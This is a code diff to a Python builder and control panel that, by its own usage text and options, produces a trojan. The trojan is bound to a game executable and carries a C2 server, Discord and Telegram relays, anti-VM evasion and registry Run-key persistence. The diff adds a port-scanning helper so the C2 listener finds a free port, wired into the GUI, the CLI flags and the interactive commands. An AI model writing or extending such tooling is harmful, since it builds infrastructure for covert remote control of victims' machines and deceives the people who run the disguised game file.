@@ -23,6 +23,7 @@ Usage:
     python auto.py game.exe --discord https://discord.com/api/webhooks/...  # relay via Discord
     python auto.py game.exe --c2 http://1.2.3.4:9400/      # manual C2 URL (for NAT/external)
     python auto.py game.exe --no-anti-vm                    # disable VM detection (for testing in VMs)
+    python auto.py game.exe --find-port                     # auto-scan for a free port (9400-9500)
 
     python auto.py --config             # show saved settings (config.json)
     python auto.py --clear-telegram     # remove saved Telegram token
@@ -190,6 +191,36 @@ def detect_public_ip(timeout=5):
         return None
     except Exception:
         return None
+
+def find_best_port(start=9400, end=9500, preferred=None):
+    """Scan a range of ports and return the first one that is free (not in use).
+
+    Tries 'preferred' first (if given), then scans start..end. Returns the port
+    number as int, or None if every port in the range is occupied.
+
+    A port is considered free if we can bind a TCP socket to it on 0.0.0.0
+    without SO_REUSEADDR (so ports already in LISTEN state are correctly
+    detected as occupied on Windows).
+    """
+    # Try preferred port first (e.g. the saved config port)
+    if preferred:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.bind(("0.0.0.0", preferred))
+            s.close()
+            return preferred
+        except (OSError, socket.error):
+            pass  # preferred is taken, scan the range
+
+    for p in range(start, end + 1):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.bind(("0.0.0.0", p))
+            s.close()
+            return p
+        except (OSError, socket.error):
+            continue
+    return None
 
 def ensure_build():
     """Build loader.exe + ckdll.dll if they don't exist."""
@@ -631,6 +662,11 @@ def pick_gui():
                   font=("Segoe UI", 9)).pack(side="left")
         port_var = tk.IntVar(value=saved_port)
         ttk.Entry(port_frame, textvariable=port_var, width=8).pack(side="left", padx=(4, 0))
+        ttk.Button(port_frame, text="FIND BEST PORT",
+                   command=lambda: _find_best_port()).pack(side="left", padx=(8, 0))
+        port_status = tk.Label(port_frame, text="", bg="#1a1a1a",
+                               font=("Segoe UI", 8, "bold"))
+        port_status.pack(side="left", padx=(8, 0))
 
         # TEST C2 button
         test_frame = tk.Frame(root, bg="#1a1a1a")
@@ -653,6 +689,25 @@ def pick_gui():
                        font=("Segoe UI", 9)).pack(side="left")
 
         # --- IP detection functions ---
+        def _find_best_port():
+            """Scan ports 9400-9500 (plus the current port) and pick the first free one."""
+            port_status.config(text="scanning 9400-9500...", fg="#888888")
+            root.update()
+            cur = port_var.get()
+            best = find_best_port(start=9400, end=9500, preferred=cur)
+            if best is not None:
+                port_var.set(best)
+                port_status.config(text="port %d is free" % best, fg="#5cb85c")
+                # Update C2 URL with the new port
+                c2_url_cur = c2_var.get().strip()
+                if c2_url_cur:
+                    # Replace the :PORT/ part
+                    import re as _re
+                    new_c2 = _re.sub(r":\d+/", ":%d/" % best, c2_url_cur)
+                    c2_var.set(new_c2)
+            else:
+                port_status.config(text="no free port in 9400-9500!", fg="#cc6600")
+
         def _detect_lan():
             ip = detect_ip()
             port = port_var.get()
@@ -952,6 +1007,7 @@ def print_help():
     log("")
     log("  OPTIONS:")
     log("    port <number>         Set C2 port (default: 9090, saved to config)")
+    log("    find-port             Scan 9400-9500 and set the first free port")
     log("    persist on|off        Enable/disable persistence (registry Run key)")
     log("    config                Show current saved configuration")
     log("    tg-chatid <token>     Find your Telegram chat ID")
@@ -1071,6 +1127,17 @@ def interactive_loop():
                 cfg["port"] = port
                 save_config(cfg)
                 log("[+] Port set to %d (saved to config)" % port)
+
+        elif cmd == "find-port":
+            log("[*] scanning for a free port (9400-9500, preferred: %d)..." % port)
+            best = find_best_port(start=9400, end=9500, preferred=port)
+            if best is not None:
+                port = best
+                cfg["port"] = port
+                save_config(cfg)
+                log("[+] Best free port: %d (saved to config)" % port)
+            else:
+                log("[-] no free port found in range 9400-9500")
 
         elif cmd == "persist":
             if rest.lower() == "on":
@@ -1330,6 +1397,7 @@ def main():
     clear_dc = False
     c2_override = None
     no_anti_vm = False
+    find_port = False
 
     # parse args
     args = sys.argv[1:]
@@ -1352,6 +1420,8 @@ def main():
             c2_override = args[i + 1]; i += 2
         elif a == "--no-anti-vm":
             no_anti_vm = True; i += 1
+        elif a == "--find-port":
+            find_port = True; i += 1
         elif a == "--config":
             show_cfg = True; i += 1
         elif a == "--clear-telegram":
@@ -1397,6 +1467,19 @@ def main():
         log("[*] Persist: loaded from config.json")
     if port == 9090 and cfg.get("port"):
         port = cfg["port"]
+
+    # --find-port: scan for a free port and use it
+    if find_port:
+        log("[*] scanning for a free port (9400-9500)...")
+        best = find_best_port(start=9400, end=9500, preferred=port)
+        if best is not None:
+            if best != port:
+                log("[+] found free port: %d (was %d)" % (best, port))
+            else:
+                log("[+] port %d is free" % best)
+            port = best
+        else:
+            log("[-] no free port found in range 9400-9500, using %d" % port)
 
     # Save new values to config if provided via CLI
     cfg_new = load_config()
